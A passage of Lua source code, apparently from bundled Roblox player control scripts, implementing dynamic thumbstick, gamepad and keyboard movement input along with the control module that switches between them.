				self.endImageFadeTween = TweenService:Create(self.endImage, ThumbstickFadeTweenInfo, { ImageTransparency = 1 })
				self.endImageFadeTween:Play()

				for i = 1, #self.middleImages do
					self.middleImageFadeTweens[i] = TweenService:Create(self.middleImages[i], ThumbstickFadeTweenInfo, { ImageTransparency = 1 })
					self.middleImageFadeTweens[i]:Play()
				end
			end
		end

		function DynamicThumbstick:FadeThumbstickFrame(fadeDuration, fadeRatio)
			self.fadeInAndOutHalfDuration = fadeDuration * 0.5
			self.fadeInAndOutBalance = fadeRatio
			self.tweenInAlphaStart = tick()
		end

		function DynamicThumbstick:InputInFrame(inputObject)
			local frameCornerTopLeft = self.thumbstickFrame.AbsolutePosition
			local frameCornerBottomRight = frameCornerTopLeft + self.thumbstickFrame.AbsoluteSize
			local inputPosition = inputObject.Position
			if inputPosition.X >= frameCornerTopLeft.X and inputPosition.Y >= frameCornerTopLeft.Y then
				if inputPosition.X <= frameCornerBottomRight.X and inputPosition.Y <= frameCornerBottomRight.Y then
					return true
				end
			end
			return false
		end

		function DynamicThumbstick:DoFadeInBackground()
			local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
			local hasFadedBackgroundInOrientation = false

			-- only fade in/out the background once per orientation
			if playerGui then
				if playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.LandscapeLeft or
					playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.LandscapeRight then
					hasFadedBackgroundInOrientation = self.hasFadedBackgroundInLandscape
					self.hasFadedBackgroundInLandscape = true
				elseif playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.Portrait then
					hasFadedBackgroundInOrientation = self.hasFadedBackgroundInPortrait
					self.hasFadedBackgroundInPortrait = true
				end
			end

			if not hasFadedBackgroundInOrientation then
				self.fadeInAndOutHalfDuration = FADE_IN_OUT_HALF_DURATION_DEFAULT
				self.fadeInAndOutBalance = FADE_IN_OUT_BALANCE_DEFAULT
				self.tweenInAlphaStart = tick()
			end
		end

		function DynamicThumbstick:DoMove(direction)
			local currentMoveVector = direction

			-- Scaled Radial Dead Zone
			local inputAxisMagnitude = currentMoveVector.magnitude
			if inputAxisMagnitude < self.radiusOfDeadZone then
				currentMoveVector = ZERO_VECTOR3
			else
				currentMoveVector = currentMoveVector.unit*(
					1 - math.max(0, (self.radiusOfMaxSpeed - currentMoveVector.magnitude)/self.radiusOfMaxSpeed)
				)
				currentMoveVector = Vector3.new(currentMoveVector.x, 0, currentMoveVector.y)
			end

			self.moveVector = currentMoveVector
		end


		function DynamicThumbstick:LayoutMiddleImages(startPos, endPos)
			local startDist = (self.thumbstickSize / 2) + self.middleSize
			local vector = endPos - startPos
			local distAvailable = vector.magnitude - (self.thumbstickRingSize / 2) - self.middleSize
			local direction = vector.unit

			local distNeeded = self.middleSpacing * NUM_MIDDLE_IMAGES
			local spacing = self.middleSpacing

			if distNeeded < distAvailable then
				spacing = distAvailable / NUM_MIDDLE_IMAGES
			end

			for i = 1, NUM_MIDDLE_IMAGES do
				local image = self.middleImages[i]
				local distWithout = startDist + (spacing * (i - 2))
				local currentDist = startDist + (spacing * (i - 1))

				if distWithout < distAvailable then
					local pos = endPos - direction * currentDist
					local exposedFraction = math.clamp(1 - ((currentDist - distAvailable) / spacing), 0, 1)

					image.Visible = true
					image.Position = UDim2.new(0, pos.X, 0, pos.Y)
					image.Size = UDim2.new(0, self.middleSize * exposedFraction, 0, self.middleSize * exposedFraction)
				else
					image.Visible = false
				end
			end
		end

		function DynamicThumbstick:MoveStick(pos)
			local vector2StartPosition = Vector2.new(self.moveTouchStartPosition.X, self.moveTouchStartPosition.Y)
			local startPos = vector2StartPosition - self.thumbstickFrame.AbsolutePosition
			local endPos = Vector2.new(pos.X, pos.Y) - self.thumbstickFrame.AbsolutePosition
			self.endImage.Position = UDim2.new(0, endPos.X, 0, endPos.Y)
			self:LayoutMiddleImages(startPos, endPos)
		end

		function DynamicThumbstick:BindContextActions()
			local function inputBegan(inputObject)
				if self.moveTouchObject then
					return Enum.ContextActionResult.Pass
				end

				if not self:InputInFrame(inputObject) then
					return Enum.ContextActionResult.Pass
				end

				if self.isFirstTouch then
					self.isFirstTouch = false
					local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out,0,false,0)
					TweenService:Create(self.startImage, tweenInfo, {Size = UDim2.new(0, 0, 0, 0)}):Play()
					TweenService:Create(
						self.endImage,
						tweenInfo,
						{Size = UDim2.new(0, self.thumbstickSize, 0, self.thumbstickSize), ImageColor3 = Color3.new(0,0,0)}
					):Play()
				end

				self.moveTouchLockedIn = false
				self.moveTouchObject = inputObject
				self.moveTouchStartPosition = inputObject.Position
				self.moveTouchFirstChanged = true

				if FADE_IN_OUT_BACKGROUND then
					self:DoFadeInBackground()
				end

				return Enum.ContextActionResult.Pass
			end

			local function inputChanged(inputObject)
				if inputObject == self.moveTouchObject then
					if self.moveTouchFirstChanged then
						self.moveTouchFirstChanged = false

						local startPosVec2 = Vector2.new(
							inputObject.Position.X - self.thumbstickFrame.AbsolutePosition.X,
							inputObject.Position.Y - self.thumbstickFrame.AbsolutePosition.Y
						)
						self.startImage.Visible = true
						self.startImage.Position = UDim2.new(0, startPosVec2.X, 0, startPosVec2.Y)
						self.endImage.Visible = true
						self.endImage.Position = self.startImage.Position

						self:FadeThumbstick(true)
						self:MoveStick(inputObject.Position)
					end

					self.moveTouchLockedIn = true

					local direction = Vector2.new(
						inputObject.Position.x - self.moveTouchStartPosition.x,
						inputObject.Position.y - self.moveTouchStartPosition.y
					)
					if math.abs(direction.x) > 0 or math.abs(direction.y) > 0 then
						self:DoMove(direction)
						self:MoveStick(inputObject.Position)
					end
					return Enum.ContextActionResult.Sink
				end
				return Enum.ContextActionResult.Pass
			end

			local function inputEnded(inputObject)
				if inputObject == self.moveTouchObject then
					self:OnInputEnded()
					if self.moveTouchLockedIn then
						return Enum.ContextActionResult.Sink
					end
				end
				return Enum.ContextActionResult.Pass
			end

			local function handleInput(actionName, inputState, inputObject)
				if inputState == Enum.UserInputState.Begin then
					return inputBegan(inputObject)
				elseif inputState == Enum.UserInputState.Change then
					return inputChanged(inputObject)
				elseif inputState == Enum.UserInputState.End then
					return inputEnded(inputObject)
				elseif inputState == Enum.UserInputState.Cancel then
					self:OnInputEnded()
				end
			end

			ContextActionService:BindActionAtPriority(
				DYNAMIC_THUMBSTICK_ACTION_NAME,
				handleInput,
				false,
				DYNAMIC_THUMBSTICK_ACTION_PRIORITY,
				Enum.UserInputType.Touch)
		end

		function DynamicThumbstick:Create(parentFrame)
			if self.thumbstickFrame then
				self.thumbstickFrame:Destroy()
				self.thumbstickFrame = nil
				if self.onRenderSteppedConn then
					self.onRenderSteppedConn:Disconnect()
					self.onRenderSteppedConn = nil
				end
			end

			self.thumbstickSize = 45
			self.thumbstickRingSize = 20
			self.middleSize = 10
			self.middleSpacing = self.middleSize + 4
			self.radiusOfDeadZone = 2
			self.radiusOfMaxSpeed = 20

			local screenSize = parentFrame.AbsoluteSize
			local isBigScreen = math.min(screenSize.x, screenSize.y) > 500
			if isBigScreen then
				self.thumbstickSize = self.thumbstickSize * 2
				self.thumbstickRingSize = self.thumbstickRingSize * 2
				self.middleSize = self.middleSize * 2
				self.middleSpacing = self.middleSpacing * 2
				self.radiusOfDeadZone = self.radiusOfDeadZone * 2
				self.radiusOfMaxSpeed = self.radiusOfMaxSpeed * 2
			end

			local function layoutThumbstickFrame(portraitMode)
				if portraitMode then
					self.thumbstickFrame.Size = UDim2.new(1, 0, 0.4, 0)
					self.thumbstickFrame.Position = UDim2.new(0, 0, 0.6, 0)
				else
					self.thumbstickFrame.Size = UDim2.new(0.4, 0, 2/3, 0)
					self.thumbstickFrame.Position = UDim2.new(0, 0, 1/3, 0)
				end
			end

			self.thumbstickFrame = Instance.new("Frame")
			self.thumbstickFrame.BorderSizePixel = 0
			self.thumbstickFrame.Name = "DynamicThumbstickFrame"
			self.thumbstickFrame.Visible = false
			self.thumbstickFrame.BackgroundTransparency = 1.0
			self.thumbstickFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			self.thumbstickFrame.Active = false
			layoutThumbstickFrame(false)

			self.startImage = Instance.new("ImageLabel")
			self.startImage.Name = "ThumbstickStart"
			self.startImage.Visible = true
			self.startImage.BackgroundTransparency = 1
			self.startImage.Image = TOUCH_CONTROLS_SHEET
			self.startImage.ImageRectOffset = Vector2.new(1,1)
			self.startImage.ImageRectSize = Vector2.new(144, 144)
			self.startImage.ImageColor3 = Color3.new(0, 0, 0)
			self.startImage.AnchorPoint = Vector2.new(0.5, 0.5)
			self.startImage.Position = UDim2.new(0, self.thumbstickRingSize * 3.3, 1, -self.thumbstickRingSize  * 2.8)
			self.startImage.Size = UDim2.new(0, self.thumbstickRingSize  * 3.7, 0, self.thumbstickRingSize  * 3.7)
			self.startImage.ZIndex = 10
			self.startImage.Parent = self.thumbstickFrame

			self.endImage = Instance.new("ImageLabel")
			self.endImage.Name = "ThumbstickEnd"
			self.endImage.Visible = true
			self.endImage.BackgroundTransparency = 1
			self.endImage.Image = TOUCH_CONTROLS_SHEET
			self.endImage.ImageRectOffset = Vector2.new(1,1)
			self.endImage.ImageRectSize =  Vector2.new(144, 144)
			self.endImage.AnchorPoint = Vector2.new(0.5, 0.5)
			self.endImage.Position = self.startImage.Position
			self.endImage.Size = UDim2.new(0, self.thumbstickSize * 0.8, 0, self.thumbstickSize * 0.8)
			self.endImage.ZIndex = 10
			self.endImage.Parent = self.thumbstickFrame

			for i = 1, NUM_MIDDLE_IMAGES do
				self.middleImages[i] = Instance.new("ImageLabel")
				self.middleImages[i].Name = "ThumbstickMiddle"
				self.middleImages[i].Visible = false
				self.middleImages[i].BackgroundTransparency = 1
				self.middleImages[i].Image = TOUCH_CONTROLS_SHEET
				self.middleImages[i].ImageRectOffset = Vector2.new(1,1)
				self.middleImages[i].ImageRectSize = Vector2.new(144, 144)
				self.middleImages[i].ImageTransparency = MIDDLE_TRANSPARENCIES[i]
				self.middleImages[i].AnchorPoint = Vector2.new(0.5, 0.5)
				self.middleImages[i].ZIndex = 9
				self.middleImages[i].Parent = self.thumbstickFrame
			end

			local CameraChangedConn = nil
			local function onCurrentCameraChanged()
				if CameraChangedConn then
					CameraChangedConn:Disconnect()
					CameraChangedConn = nil
				end
				local newCamera = workspace.CurrentCamera
				if newCamera then
					local function onViewportSizeChanged()
						local size = newCamera.ViewportSize
						local portraitMode = size.X < size.Y
						layoutThumbstickFrame(portraitMode)
					end
					CameraChangedConn = newCamera:GetPropertyChangedSignal("ViewportSize"):Connect(onViewportSizeChanged)
					onViewportSizeChanged()
				end
			end
			workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(onCurrentCameraChanged)
			if workspace.CurrentCamera then
				onCurrentCameraChanged()
			end

			self.moveTouchStartPosition = nil

			self.startImageFadeTween = nil
			self.endImageFadeTween = nil
			self.middleImageFadeTweens = {}

			self.onRenderSteppedConn = RunService.RenderStepped:Connect(function()
				if self.tweenInAlphaStart ~= nil then
					local delta = tick() - self.tweenInAlphaStart
					local fadeInTime = (self.fadeInAndOutHalfDuration * 2 * self.fadeInAndOutBalance)
					self.thumbstickFrame.BackgroundTransparency = 1 - FADE_IN_OUT_MAX_ALPHA*math.min(delta/fadeInTime, 1)
					if delta > fadeInTime then
						self.tweenOutAlphaStart = tick()
						self.tweenInAlphaStart = nil
					end
				elseif self.tweenOutAlphaStart ~= nil then
					local delta = tick() - self.tweenOutAlphaStart
					local fadeOutTime = (self.fadeInAndOutHalfDuration * 2) - (self.fadeInAndOutHalfDuration * 2 * self.fadeInAndOutBalance)
					self.thumbstickFrame.BackgroundTransparency = 1 - FADE_IN_OUT_MAX_ALPHA + FADE_IN_OUT_MAX_ALPHA*math.min(delta/fadeOutTime, 1)
					if delta > fadeOutTime  then
						self.tweenOutAlphaStart = nil
					end
				end
			end)

			self.onTouchEndedConn = UserInputService.TouchEnded:connect(function(inputObject)
				if inputObject == self.moveTouchObject then
					self:OnInputEnded()
				end
			end)

			GuiService.MenuOpened:connect(function()
				if self.moveTouchObject then
					self:OnInputEnded()
				end
			end)

			local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
			while not playerGui do
				LocalPlayer.ChildAdded:wait()
				playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
			end

			local playerGuiChangedConn = nil
			local originalScreenOrientationWasLandscape =	playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.LandscapeLeft or
				playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.LandscapeRight

			local function longShowBackground()
				self.fadeInAndOutHalfDuration = 2.5
				self.fadeInAndOutBalance = 0.05
				self.tweenInAlphaStart = tick()
			end

			playerGuiChangedConn = playerGui:GetPropertyChangedSignal("CurrentScreenOrientation"):Connect(function()
				if (originalScreenOrientationWasLandscape and playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.Portrait) or
					(not originalScreenOrientationWasLandscape and playerGui.CurrentScreenOrientation ~= Enum.ScreenOrientation.Portrait) then

					playerGuiChangedConn:disconnect()
					longShowBackground()

					if originalScreenOrientationWasLandscape then
						self.hasFadedBackgroundInPortrait = true
					else
						self.hasFadedBackgroundInLandscape = true
					end
				end
			end)

			self.thumbstickFrame.Parent = parentFrame

			if game:IsLoaded() then
				longShowBackground()
			else
				coroutine.wrap(function()
					game.Loaded:Wait()
					longShowBackground()
				end)()
			end
		end

		return DynamicThumbstick
	end

	function _Gamepad()
		local UserInputService = game:GetService("UserInputService")
		local ContextActionService = game:GetService("ContextActionService")

		--[[ Constants ]]--
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local NONE = Enum.UserInputType.None
		local thumbstickDeadzone = 0.2

		--[[ The Module ]]--
		local BaseCharacterController = _BaseCharacterController()
		local Gamepad = setmetatable({}, BaseCharacterController)
		Gamepad.__index = Gamepad

		function Gamepad.new(CONTROL_ACTION_PRIORITY)
			local self = setmetatable(BaseCharacterController.new(), Gamepad)

			self.CONTROL_ACTION_PRIORITY = CONTROL_ACTION_PRIORITY

			self.forwardValue  = 0
			self.backwardValue = 0
			self.leftValue = 0
			self.rightValue = 0

			self.activeGamepad = NONE	-- Enum.UserInputType.Gamepad1, 2, 3...
			self.gamepadConnectedConn = nil
			self.gamepadDisconnectedConn = nil
			return self
		end

		function Gamepad:Enable(enable)
			if not UserInputService.GamepadEnabled then
				return false
			end

			if enable == self.enabled then
				-- Module is already in the state being requested. True is returned here since the module will be in the state
				-- expected by the code that follows the Enable() call. This makes more sense than returning false to indicate
				-- no action was necessary. False indicates failure to be in requested/expected state.
				return true
			end

			self.forwardValue  = 0
			self.backwardValue = 0
			self.leftValue = 0
			self.rightValue = 0
			self.moveVector = ZERO_VECTOR3
			self.isJumping = false

			if enable then
				self.activeGamepad = self:GetHighestPriorityGamepad()
				if self.activeGamepad ~= NONE then
					self:BindContextActions()
					self:ConnectGamepadConnectionListeners()
				else
					-- No connected gamepads, failure to enable
					return false
				end
			else
				self:UnbindContextActions()
				self:DisconnectGamepadConnectionListeners()
				self.activeGamepad = NONE
			end

			self.enabled = enable
			return true
		end

		-- This function selects the lowest number gamepad from the currently-connected gamepad
		-- and sets it as the active gamepad
		function Gamepad:GetHighestPriorityGamepad()
			local connectedGamepads = UserInputService:GetConnectedGamepads()
			local bestGamepad = NONE -- Note that this value is higher than all valid gamepad values
			for _, gamepad in pairs(connectedGamepads) do
				if gamepad.Value < bestGamepad.Value then
					bestGamepad = gamepad
				end
			end
			return bestGamepad
		end

		function Gamepad:BindContextActions()

			if self.activeGamepad == NONE then
				-- There must be an active gamepad to set up bindings
				return false
			end

			local handleJumpAction = function(actionName, inputState, inputObject)
				self.isJumping = (inputState == Enum.UserInputState.Begin)
				return Enum.ContextActionResult.Sink
			end

			local handleThumbstickInput = function(actionName, inputState, inputObject)

				if inputState == Enum.UserInputState.Cancel then
					self.moveVector = ZERO_VECTOR3
					return Enum.ContextActionResult.Sink
				end

				if self.activeGamepad ~= inputObject.UserInputType then
					return Enum.ContextActionResult.Pass
				end
				if inputObject.KeyCode ~= Enum.KeyCode.Thumbstick1 then return end

				if inputObject.Position.magnitude > thumbstickDeadzone then
					self.moveVector  =  Vector3.new(inputObject.Position.X, 0, -inputObject.Position.Y)
				else
					self.moveVector = ZERO_VECTOR3
				end
				return Enum.ContextActionResult.Sink
			end

			ContextActionService:BindActivate(self.activeGamepad, Enum.KeyCode.ButtonR2)
			ContextActionService:BindActionAtPriority("jumpAction", handleJumpAction, false,
				self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.ButtonA)
			ContextActionService:BindActionAtPriority("moveThumbstick", handleThumbstickInput, false,
				self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.Thumbstick1)

			return true
		end

		function Gamepad:UnbindContextActions()
			if self.activeGamepad ~= NONE then
				ContextActionService:UnbindActivate(self.activeGamepad, Enum.KeyCode.ButtonR2)
			end
			ContextActionService:UnbindAction("moveThumbstick")
			ContextActionService:UnbindAction("jumpAction")
		end

		function Gamepad:OnNewGamepadConnected()
			-- A new gamepad has been connected.
			local bestGamepad = self:GetHighestPriorityGamepad()

			if bestGamepad == self.activeGamepad then
				-- A new gamepad was connected, but our active gamepad is not changing
				return
			end

			if bestGamepad == NONE then
				-- There should be an active gamepad when GamepadConnected fires, so this should not
				-- normally be hit. If there is no active gamepad, unbind actions but leave
				-- the module enabled and continue to listen for a new gamepad connection.
				warn("Gamepad:OnNewGamepadConnected found no connected gamepads")
				self:UnbindContextActions()
				return
			end

			if self.activeGamepad ~= NONE then
				-- Switching from one active gamepad to another
				self:UnbindContextActions()
			end

			self.activeGamepad = bestGamepad
			self:BindContextActions()
		end

		function Gamepad:OnCurrentGamepadDisconnected()
			if self.activeGamepad ~= NONE then
				ContextActionService:UnbindActivate(self.activeGamepad, Enum.KeyCode.ButtonR2)
			end

			local bestGamepad = self:GetHighestPriorityGamepad()

			if self.activeGamepad ~= NONE and bestGamepad == self.activeGamepad then
				warn("Gamepad:OnCurrentGamepadDisconnected found the supposedly disconnected gamepad in connectedGamepads.")
				self:UnbindContextActions()
				self.activeGamepad = NONE
				return
			end

			if bestGamepad == NONE then
				-- No active gamepad, unbinding actions but leaving gamepad connection listener active
				self:UnbindContextActions()
				self.activeGamepad = NONE
			else
				-- Set new gamepad as active and bind to tool activation
				self.activeGamepad = bestGamepad
				ContextActionService:BindActivate(self.activeGamepad, Enum.KeyCode.ButtonR2)
			end
		end

		function Gamepad:ConnectGamepadConnectionListeners()
			self.gamepadConnectedConn = UserInputService.GamepadConnected:Connect(function(gamepadEnum)
				self:OnNewGamepadConnected()
			end)

			self.gamepadDisconnectedConn = UserInputService.GamepadDisconnected:Connect(function(gamepadEnum)
				if self.activeGamepad == gamepadEnum then
					self:OnCurrentGamepadDisconnected()
				end
			end)

		end

		function Gamepad:DisconnectGamepadConnectionListeners()
			if self.gamepadConnectedConn then
				self.gamepadConnectedConn:Disconnect()
				self.gamepadConnectedConn = nil
			end

			if self.gamepadDisconnectedConn then
				self.gamepadDisconnectedConn:Disconnect()
				self.gamepadDisconnectedConn = nil
			end
		end

		return Gamepad
	end

	function _Keyboard()

		--[[ Roblox Services ]]--
		local UserInputService = game:GetService("UserInputService")
		local ContextActionService = game:GetService("ContextActionService")

		--[[ Constants ]]--
		local ZERO_VECTOR3 = Vector3.new(0,0,0)

		--[[ The Module ]]--
		local BaseCharacterController = _BaseCharacterController()
		local Keyboard = setmetatable({}, BaseCharacterController)
		Keyboard.__index = Keyboard

		function Keyboard.new(CONTROL_ACTION_PRIORITY)
			local self = setmetatable(BaseCharacterController.new(), Keyboard)

			self.CONTROL_ACTION_PRIORITY = CONTROL_ACTION_PRIORITY

			self.textFocusReleasedConn = nil
			self.textFocusGainedConn = nil
			self.windowFocusReleasedConn = nil

			self.forwardValue  = 0
			self.backwardValue = 0
			self.leftValue = 0
			self.rightValue = 0

			self.jumpEnabled = true

			return self
		end

		function Keyboard:Enable(enable)
			if not UserInputService.KeyboardEnabled then
				return false
			end

			if enable == self.enabled then
				-- Module is already in the state being requested. True is returned here since the module will be in the state
				-- expected by the code that follows the Enable() call. This makes more sense than returning false to indicate
				-- no action was necessary. False indicates failure to be in requested/expected state.
				return true
			end

			self.forwardValue  = 0
			self.backwardValue = 0
			self.leftValue = 0
			self.rightValue = 0
			self.moveVector = ZERO_VECTOR3
			self.jumpRequested = false
			self:UpdateJump()

			if enable then
				self:BindContextActions()
				self:ConnectFocusEventListeners()
			else
				self:UnbindContextActions()
				self:DisconnectFocusEventListeners()
			end

			self.enabled = enable
			return true
		end

		function Keyboard:UpdateMovement(inputState)
			if inputState == Enum.UserInputState.Cancel then
				self.moveVector = ZERO_VECTOR3
			else
				self.moveVector = Vector3.new(self.leftValue + self.rightValue, 0, self.forwardValue + self.backwardValue)
			end
		end

		function Keyboard:UpdateJump()
			self.isJumping = self.jumpRequested
		end

		function Keyboard:BindContextActions()

			-- Note: In the previous version of this code, the movement values were not zeroed-out on UserInputState. Cancel, now they are,
			-- which fixes them from getting stuck on.
			-- We return ContextActionResult.Pass here for legacy reasons.
			-- Many games rely on gameProcessedEvent being false on UserInputService.InputBegan for these control actions.
			local handleMoveForward = function(actionName, inputState, inputObject)
				self.forwardValue = (inputState == Enum.UserInputState.Begin) and -1 or 0
				self:UpdateMovement(inputState)
				return Enum.ContextActionResult.Pass
			end

			local handleMoveBackward = function(actionName, inputState, inputObject)
				self.backwardValue = (inputState == Enum.UserInputState.Begin) and 1 or 0
				self:UpdateMovement(inputState)
				return Enum.ContextActionResult.Pass
			end

			local handleMoveLeft = function(actionName, inputState, inputObject)
				self.leftValue = (inputState == Enum.UserInputState.Begin) and -1 or 0
				self:UpdateMovement(inputState)
				return Enum.ContextActionResult.Pass
			end

			local handleMoveRight = function(actionName, inputState, inputObject)
				self.rightValue = (inputState == Enum.UserInputState.Begin) and 1 or 0
				self:UpdateMovement(inputState)
				return Enum.ContextActionResult.Pass
			end

			local handleJumpAction = function(actionName, inputState, inputObject)
				self.jumpRequested = self.jumpEnabled and (inputState == Enum.UserInputState.Begin)
				self:UpdateJump()
				return Enum.ContextActionResult.Pass
			end

			-- TODO: Revert to KeyCode bindings so that in the future the abstraction layer from actual keys to
			-- movement direction is done in Lua
			ContextActionService:BindActionAtPriority("moveForwardAction", handleMoveForward, false,
				self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterForward)
			ContextActionService:BindActionAtPriority("moveBackwardAction", handleMoveBackward, false,
				self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterBackward)
			ContextActionService:BindActionAtPriority("moveLeftAction", handleMoveLeft, false,
				self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterLeft)
			ContextActionService:BindActionAtPriority("moveRightAction", handleMoveRight, false,
				self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterRight)
			ContextActionService:BindActionAtPriority("jumpAction", handleJumpAction, false,
				self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterJump)
		end

		function Keyboard:UnbindContextActions()
			ContextActionService:UnbindAction("moveForwardAction")
			ContextActionService:UnbindAction("moveBackwardAction")
			ContextActionService:UnbindAction("moveLeftAction")
			ContextActionService:UnbindAction("moveRightAction")
			ContextActionService:UnbindAction("jumpAction")
		end

		function Keyboard:ConnectFocusEventListeners()
			local function onFocusReleased()
				self.moveVector = ZERO_VECTOR3
				self.forwardValue  = 0
				self.backwardValue = 0
				self.leftValue = 0
				self.rightValue = 0
				self.jumpRequested = false
				self:UpdateJump()
			end

			local function onTextFocusGained(textboxFocused)
				self.jumpRequested = false
				self:UpdateJump()
			end

			self.textFocusReleasedConn = UserInputService.TextBoxFocusReleased:Connect(onFocusReleased)
			self.textFocusGainedConn = UserInputService.TextBoxFocused:Connect(onTextFocusGained)
			self.windowFocusReleasedConn = UserInputService.WindowFocused:Connect(onFocusReleased)
		end

		function Keyboard:DisconnectFocusEventListeners()
			if self.textFocusReleasedCon then
				self.textFocusReleasedCon:Disconnect()
				self.textFocusReleasedCon = nil
			end
			if self.textFocusGainedConn then
				self.textFocusGainedConn:Disconnect()
				self.textFocusGainedConn = nil
			end
			if self.windowFocusReleasedConn then
				self.windowFocusReleasedConn:Disconnect()
				self.windowFocusReleasedConn = nil
			end
		end

		return Keyboard
	end

	function _ControlModule()
		local ControlModule = {}
		ControlModule.__index = ControlModule

		--[[ Roblox Services ]]--
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local UserInputService = game:GetService("UserInputService")
		local Workspace = game:GetService("Workspace")
		local UserGameSettings = UserSettings():GetService("UserGameSettings")

		-- Roblox User Input Control Modules - each returns a new() constructor function used to create controllers as needed
		local Keyboard = _Keyboard()
		local Gamepad = _Gamepad()
		local DynamicThumbstick = _DynamicThumbstick()

		local FFlagUserMakeThumbstickDynamic do
			local success, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserMakeThumbstickDynamic")
			end)
			FFlagUserMakeThumbstickDynamic = success and value
		end

		local TouchThumbstick = FFlagUserMakeThumbstickDynamic and DynamicThumbstick or _TouchThumbstick()

		-- These controllers handle only walk/run movement, jumping is handled by the
		-- TouchJump controller if any of these are active
		local ClickToMove = _ClickToMoveController()
		local TouchJump = _TouchJump()

		local VehicleController = _VehicleController()

		local CONTROL_ACTION_PRIORITY = Enum.ContextActionPriority.Default.Value

		-- Mapping from movement mode and lastInputType enum values to control modules to avoid huge if elseif switching
		local movementEnumToModuleMap = {
			[Enum.TouchMovementMode.DPad] = DynamicThumbstick,
			[Enum.DevTouchMovementMode.DPad] = DynamicThumbstick,
			[Enum.TouchMovementMode.Thumbpad] = DynamicThumbstick,
			[Enum.DevTouchMovementMode.Thumbpad] = DynamicThumbstick,
			[Enum.TouchMovementMode.Thumbstick] = TouchThumbstick,
			[Enum.DevTouchMovementMode.Thumbstick] = TouchThumbstick,
			[Enum.TouchMovementMode.DynamicThumbstick] = DynamicThumbstick,
			[Enum.DevTouchMovementMode.DynamicThumbstick] = DynamicThumbstick,
			[Enum.TouchMovementMode.ClickToMove] = ClickToMove,
			[Enum.DevTouchMovementMode.ClickToMove] = ClickToMove,

			-- Current default
			[Enum.TouchMovementMode.Default] = DynamicThumbstick,

			[Enum.ComputerMovementMode.Default] = Keyboard,
			[Enum.ComputerMovementMode.KeyboardMouse] = Keyboard,
			[Enum.DevComputerMovementMode.KeyboardMouse] = Keyboard,
			[Enum.DevComputerMovementMode.Scriptable] = nil,
			[Enum.ComputerMovementMode.ClickToMove] = ClickToMove,
			[Enum.DevComputerMovementMode.ClickToMove] = ClickToMove,
		}

		-- Keyboard controller is really keyboard and mouse controller
		local computerInputTypeToModuleMap = {
			[Enum.UserInputType.Keyboard] = Keyboard,
			[Enum.UserInputType.MouseButton1] = Keyboard,
			[Enum.UserInputType.MouseButton2] = Keyboard,
			[Enum.UserInputType.MouseButton3] = Keyboard,
			[Enum.UserInputType.MouseWheel] = Keyboard,
			[Enum.UserInputType.MouseMovement] = Keyboard,
			[Enum.UserInputType.Gamepad1] = Gamepad,
			[Enum.UserInputType.Gamepad2] = Gamepad,
			[Enum.UserInputType.Gamepad3] = Gamepad,
			[Enum.UserInputType.Gamepad4] = Gamepad,
		}

		local lastInputType

		function ControlModule.new()
			local self = setmetatable({},ControlModule)

			-- The Modules above are used to construct controller instances as-needed, and this
			-- table is a map from Module to the instance created from it
			self.controllers = {}

			self.activeControlModule = nil	-- Used to prevent unnecessarily expensive checks on each input event
			self.activeController = nil
			self.touchJumpController = nil
			self.moveFunction = Players.LocalPlayer.Move
			self.humanoid = nil
			self.lastInputType = Enum.UserInputType.None

			-- For Roblox self.vehicleController
			self.humanoidSeatedConn = nil
			self.vehicleController = nil

			self.touchControlFrame = nil

			self.vehicleController = VehicleController.new(CONTROL_ACTION_PRIORITY)

			Players.LocalPlayer.CharacterAdded:Connect(function(char) self:OnCharacterAdded(char) end)
			Players.LocalPlayer.CharacterRemoving:Connect(function(char) self:OnCharacterRemoving(char) end)
			if Players.LocalPlayer.Character then
				self:OnCharacterAdded(Players.LocalPlayer.Character)
			end

			RunService:BindToRenderStep("ControlScriptRenderstep", Enum.RenderPriority.Input.Value, function(dt)
				self:OnRenderStepped(dt)
			end)

			UserInputService.LastInputTypeChanged:Connect(function(newLastInputType)
				self:OnLastInputTypeChanged(newLastInputType)
			end)


			UserGameSettings:GetPropertyChangedSignal("TouchMovementMode"):Connect(function()
				self:OnTouchMovementModeChange()
			end)
			Players.LocalPlayer:GetPropertyChangedSignal("DevTouchMovementMode"):Connect(function()
				self:OnTouchMovementModeChange()
			end)

			UserGameSettings:GetPropertyChangedSignal("ComputerMovementMode"):Connect(function()
				self:OnComputerMovementModeChange()
			end)
			Players.LocalPlayer:GetPropertyChangedSignal("DevComputerMovementMode"):Connect(function()
				self:OnComputerMovementModeChange()
			end)

			--[[ Touch Device UI ]]--
			self.playerGui = nil
			self.touchGui = nil
			self.playerGuiAddedConn = nil

			if UserInputService.TouchEnabled then
				self.playerGui = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
				if self.playerGui then
					self:CreateTouchGuiContainer()
					self:OnLastInputTypeChanged(UserInputService:GetLastInputType())
				else
					self.playerGuiAddedConn = Players.LocalPlayer.ChildAdded:Connect(function(child)
						if child:IsA("PlayerGui") then
							self.playerGui = child
							self:CreateTouchGuiContainer()
							self.playerGuiAddedConn:Disconnect()
							self.playerGuiAddedConn = nil
							self:OnLastInputTypeChanged(UserInputService:GetLastInputType())
						end
					end)
				end
			else
				self:OnLastInputTypeChanged(UserInputService:GetLastInputType())
			end

			return self
		end

		-- Convenience function so that calling code does not have to first get the activeController
